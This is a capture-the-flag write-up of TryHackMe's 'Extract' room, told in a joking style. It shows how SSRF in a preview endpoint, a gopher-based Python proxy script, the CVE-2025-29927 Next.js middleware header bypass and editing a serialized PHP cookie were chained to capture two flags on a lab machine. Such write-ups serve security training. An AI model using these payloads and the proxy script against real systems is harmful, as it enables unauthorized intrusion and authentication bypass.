**Executive Summary: **  
The Extract room is TryHackMe's premium hard-level challenge that transforms you from a casual web surfer into a digital archaeologist, extracting secrets from digital libraries like you're Indiana Jones with a keyboard. This 90-minute rollercoaster involves Server-Side Request Forgery (SSRF) vulnerabilities, Next.js middleware authentication bypass, gopher protocol exploitation, and cookie manipulation that would make a master chef jealous.

Think of it as a cybersecurity escape room where the escape is finding flags, and the room is the entire internet infrastructure. Spoiler alert: There's no physical escape, just existential dread and the sweet satisfaction of pwning badly configured web applications.

---

🔍 **Initial Reconnaissance: Knocking on Digital Doors**

### The Nmap Symphony in B-Minor (for "Barely Secure")

Our journey begins with the classic nmap scan, that beautiful symphony of port discovery that makes every pentester's heart sing:

```bash
nmap -T4 -n -sC -sV -Pn -p- 10.10.212.133
```

**Results:**

* **Port 22 (SSH):** OpenSSH 9.6p1 - The bouncer at the club who actually does his job
    
* **Port 80 (HTTP):** Apache 2.4.58 - The friendly doorman who lets everyone in
    

As the great philosopher once said: "There are 10 types of people in this world—those who understand binary and those who don't". Well, there are also two types of ports in this room: the locked one and the "please hack me" one.

### Web Application Discovery: Welcome to TryBookMe

Visiting `http://10.10.212.133/` reveals TryBookMe - Online Library, which sounds about as secure as leaving your diary open in a coffee shop. The application allows users to preview documents through an iframe.

The smoking gun appears in the page source: `/preview.php` endpoint with a **url** parameter.

---

🚀 **The SSRF Adventure: Server-Side Request Forgery Gone Wild**

### Testing the Waters (Or: How I Learned to Stop Trusting User Input)

**Basic Test:**

```bash
echo "test" > test.txt
python3 -m http.server 80
```

Request:

```plaintext
http://10.10.212.133/preview.php?url=http://10.4.4.28/test.txt
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756827129079/45ce7dc4-cf05-49dc-bc74-8e92eb5c437b.png align="center")

✅ Success! The server dutifully fetches our content.

### Protocol Testing: The Good, The Bad, and The Gopher

```text
file://   → Blocked
http://   → Works
gopher:// → Works
```

Testing with:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756827161697/8199e8e2-58bf-40ba-bb92-c38f98e119c6.png align="center")

```plaintext
gopher://10.4.4.28:4444/_test
```

---

### Internal Service Discovery: Port Knocking for Fun and Profit

```bash
ffuf -u 'http://10.10.212.133/preview.php?url=http://127.0.0.1:FUZZ/'      -w <(seq 1 65535) -mc all -t 100 -fs 0
```

Discovery: Port **10000** is listening internally.  
Requesting `http://127.0.0.1:10000/` reveals a Next.js application.

---

🎭 **The Proxy Comedy: Gopher-Powered Shenanigans**

```python
#!/usr/bin/env python3
import socket, requests, urllib.parse, threading

LHOST = '127.0.0.1'
LPORT = 5000
TARGET_HOST = "10.10.212.133"
HOST_TO_PROXY = "127.0.0.1"
PORT_TO_PROXY = 10000

def handle_client(conn, addr):
    with conn:
        data = conn.recv(65536)
        double_encoded_data = urllib.parse.quote(urllib.parse.quote(data))
        target_url = f"http://{TARGET_HOST}/preview.php?url=gopher://{HOST_TO_PROXY}:{PORT_TO_PROXY}/_{double_encoded_data}"
        resp = requests.get(target_url)
        conn.sendall(resp.content)

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((LHOST, LPORT))
    server.listen(5)
    print(f"[*] Listening on {LHOST}:{LPORT}")
    while True:
        client_socket, addr = server.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_handler.start()

if __name__ == "__main__":
    start_server()
```

---

🔐 **Next.js Authentication Bypass: CVE-2025-29927 Strikes Back**

Bypassing with the following header:

```plaintext
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756827194947/71ebdc44-2099-417a-bc01-ba973d4c5337.png align="center")

Now accessing `/customapi` reveals:

* **Flag 1 🎉**
    
* **Credentials:** `librarian:L[REDACTED]!`
    

---

🍪 **Cookie Manipulation: The Sweet Science of Authentication Bypass**

### IP Restriction Bypass

Use the SSRF proxy targeting port 80 to access `/management/`.

### 2FA Bypass

After logging in, `/management/2fa.php` sets this cookie:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756827389476/936e357d-fe8a-4cdd-bdba-436484872d94.png align="center")

```plaintext
O:9:"AuthToken":1:{s:9:"validated";b:0;}
```

Change `b:0;` → `b:1;`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756827284011/0920d14d-c6a6-4825-838d-20412b523485.png align="center")

✅ This bypasses 2FA and reveals **Flag 2 🎉**

---

🏆 **Conclusion**  
We successfully exploited:

* SSRF in `/preview.php`
    
* Gopher protocol for internal access
    
* Next.js middleware bypass (CVE-2025-29927)
    
* Cookie manipulation for 2FA bypass
    

**Flags Captured: 2/2 🎯**
